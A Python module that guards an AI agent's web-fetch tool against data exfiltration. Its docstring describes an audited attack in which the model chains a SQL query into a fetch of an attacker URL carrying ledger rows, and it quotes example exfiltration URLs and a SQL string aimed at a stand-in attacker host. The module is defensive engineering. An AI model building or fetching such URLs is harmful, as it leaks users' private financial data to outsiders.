"""Egress control for model-chosen URLs.

`core.net_guard.assert_public_url` answers **where** a fetch may connect — it blocks private,
loopback, link-local and cloud-metadata targets. It deliberately permits any *public* host,
because that is the entire point of a web-fetch tool.

**What leaves with the request** is bounded by provenance, not length (security audit
2026-08-25 FINDING 1: `run_sql_query` → `fetch_page("https://attacker/c?d=<ledger>")`, both
ungated). A length cap failed because signed capability links (a Steam receipt's ~900-char
`sparams` token) are exactly the URLs the unattended email-scan automation must read.

The rule: a fetch tool may run without a human only for a URL that ARRIVED FROM OUTSIDE — it
appeared verbatim in a web-search result's ``url`` field, a fetched page, or an email the app
read. Such a URL existed before the model saw any private data, so it cannot carry any. A URL
the model COMPOSED (the exfiltration shape: ledger rows spliced into a path or query) gets a
confirm card where one can be shown, and is refused everywhere else (automations, MCP, REST).

Harvest sources are a closed list on purpose. Any tool that computes over private data or
echoes model input (``run_sql_query`` can ``SELECT 'https://attacker/?d=' || payee``) must
never feed the set. Search results contribute only their structured ``url`` field because an
AI answer engine's prose can echo the query string.

The set is process-wide, not per-run: the property is "came from outside", which a URL keeps
no matter which run saw it. Losing it on restart only costs a card.
"""

from __future__ import annotations

import html
import json
import re
from collections import OrderedDict

from backend.core.net_guard import UnsafeUrlError, assert_public_url

_MAX_SEEN = 20_000
_seen: "OrderedDict[str, None]" = OrderedDict()
_URL_RE = re.compile(r"https?://[^\s\"'<>\\`]+")
_TRAILING = ".,;:!?)]}*"

# Inbound tools whose WHOLE text is outside content (page bodies, mail bodies).
_CONTENT_SOURCES = frozenset({"fetch_page", "email_get_messages", "email_search_messages"})
# Search tools: only their results' structured ``url`` fields count.
_SEARCH_SOURCES = frozenset({"web_search", "x_search"})


def assert_safe_outbound_url(url: str) -> None:
    """Raise ``UnsafeUrlError`` unless ``url`` is safe to *reach* (the SSRF guard)."""
    assert_public_url(url)


def _provider_tool(name: str, verb: str) -> bool:
    from backend.ai.tools.web_search_providers import _PROVIDER_TOOLS

    return any(v == verb and t == name for (_, v), t in _PROVIDER_TOOLS.items())


def is_fetch_tool(name: str) -> bool:
    return name == "fetch_page" or _provider_tool(name, "fetch")


def _norm(url: str) -> str:
    return html.unescape(url.strip()).split("#", 1)[0].rstrip(_TRAILING)


def _remember(url: str) -> None:
    key = _norm(url)
    if not key:
        return
    _seen[key] = None
    _seen.move_to_end(key)
    while len(_seen) > _MAX_SEEN:
        _seen.popitem(last=False)


def note_inbound(name: str, text: str | None) -> None:
    """Record URLs from one inbound tool result. Best-effort: never raises."""
    if not text:
        return
    try:
        if name in _SEARCH_SOURCES or _provider_tool(name, "search"):
            results = json.loads(text)
            for r in results if isinstance(results, list) else []:
                if isinstance(r, dict) and isinstance(r.get("url"), str):
                    _remember(r["url"])
        elif name in _CONTENT_SOURCES or is_fetch_tool(name):
            for match in _URL_RE.findall(html.unescape(text)):
                _remember(match)
    except Exception:  # noqa: BLE001 — a missed harvest only costs a card
        pass


def fetch_allowed(name: str, input_data: dict | None) -> bool:
    """False when ``name`` is a fetch tool asked for a URL that never arrived from outside."""
    if not is_fetch_tool(name):
        return True
    url = (input_data or {}).get("url")
    return isinstance(url, str) and _norm(url) in _seen


def unseen_url_refusal(name: str, input_data: dict | None) -> tuple[str, None]:
    url = (input_data or {}).get("url")
    text = json.dumps(
        {
            "ok": False,
            "error": (
                f"{name} refused {url!r}: that URL did not come from a search result, a page "
                "or an email this app read, and nobody is here to approve it. Fetch only "
                "links you found, or ask the user to open this one in chat."
            ),
        },
        ensure_ascii=False,
    )
    return text, None


__all__ = [
    "UnsafeUrlError",
    "assert_safe_outbound_url",
    "fetch_allowed",
    "is_fetch_tool",
    "note_inbound",
    "unseen_url_refusal",
]
